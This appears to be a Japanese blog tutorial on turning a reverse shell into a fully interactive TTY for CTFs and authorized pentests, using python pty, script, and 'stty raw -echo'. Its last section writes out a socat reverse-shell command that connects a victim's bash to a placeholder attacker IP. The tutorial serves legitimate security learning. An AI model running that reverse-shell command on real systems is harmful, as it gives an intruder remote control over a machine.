# リバースシェルを対話可能な TTY に昇格させる

リバースシェルや Web 経由のコマンド実行で手に入るシェルは、たいてい不安定です。
`Ctrl-C` でセッションごと落ちたり、`su` / `ssh` / `vi` などが動かなかったり、矢印キーやタブ補完が効かなかったりします。
これは、割り当てられているのが本物の端末 (TTY: TeleTYpewriter) ではなく、単なる stdin/stdout を繋いだパイプだからです。

ここでは、そうした貧弱なシェルを **対話可能な TTY に昇格 (upgrade)** させる手順を整理します。
CTF や許可されたペネトレーションテストで、自分が得たシェルを扱いやすくするための内容です。

> 本記事は自身が管理する環境、または許可された検証環境での作業を前提としています。
{: .prompt-warning }

## なぜシェルが不安定なのか

通常ログインしたシェルには擬似端末 (pty) が割り当てられ、ジョブ制御・行編集・シグナル送信 (`Ctrl-C` など) が機能します。
一方、リバースシェルなどで得たプロセスは `stdin`/`stdout` がソケットやパイプに繋がっているだけで、制御端末を持ちません。

その結果、次のようなことが起きることがあります。

- コマンドを実行すると、実行するコマンド→その結果の順に出力される（実行コマンドの内容の重複）
- `Ctrl-C` を押すと、プログラムではなく接続全体が切れる
- `sudo` / `su` / `ssh` / `mysql` などパスワード入力を伴うコマンドが `must be run from a terminal` 系のエラーで失敗する
- `vi` / `top` / `less` といった全画面コマンドが崩れる
- コマンド履歴 (↑↓) やタブ補完が効かない

## TTY を得る

まずはプロセス側に pty を割り当てます。ターゲットに入っているものを使えばよく、`python3` があれば次が考えられます。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`python` しかない環境ならそちらでも同じです。環境に応じて以下のような代替もあります。

```bash
# script コマンドを使う方法（/dev/null に実体を捨てつつ pty を確保）
script -qc /bin/bash /dev/null

# Perl
perl -e 'exec "/bin/bash";'
```

この時点で `sudo` や `ssh` などは通るようになりますが、まだ `Ctrl-C` はセッションを巻き込みますし、行編集も不完全です。
完全な対話環境にするには、手元の端末設定と噛み合わせる必要があります。

## セッションを完全な対話環境に昇格させる

ここが本題です。次の 3 ステップで、ローカル端末の raw モードをリモートの pty に橋渡しします。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# その後、ctrl-z でプロセスをバックグラウンドへ送ります
stty raw -echo; fg
# これにより、セッションの更新が出来ます
```

それぞれの意味は次の通りです。

1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
   リモート側で pty 付きの `bash` を起動する。
2. `Ctrl-Z`
   そのシェルを一時停止し、手元の（リバースシェルを受けている）ローカルシェルに制御を戻す。
3. `stty raw -echo; fg`
   **ローカル端末** を raw モード（入力をそのままリモートへ渡し、ローカルのエコーを切る）にしてから、`fg` で先ほどのリモートシェルを前面に戻す。

`stty raw` によって `Ctrl-C` や `Ctrl-Z` などのキー入力がローカルで解釈されず、そのままリモートの pty へ届くようになります。
`-echo` はローカルでの二重表示を防ぐためのものです。

### 画面サイズと環境変数を合わせる

必要に応じて、`fg` 後に次を打ち込んで整えます。

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
# vi/top などの表示を正すため、手元の端末サイズに合わせる
stty rows 50 columns 200
```

`rows`/`columns` の値は、ローカルの別タブで `stty size` を実行して確認した値を入れます。

## 元に戻す

昇格したシェルから抜けた後、ローカル端末が raw モードのままだと表示が崩れたままになります。
その場合は、見えなくても次を打てば元に戻ります。

```bash
reset
# もしくは
stty sane
```

## 補足: pty が使えない環境

ターゲットに `python` も `script` も `perl` も無い場合は、`socat` を使う方法が考えられます。
攻撃側と被害側の双方で `socat` が使えるなら、最初から完全な pty 付きシェルを張れます。

```bash
# 攻撃側(リスナー)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# 被害側
socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444
```

この場合は本記事の `stty` 手順を踏まなくても、はじめから対話可能な TTY が得られます。
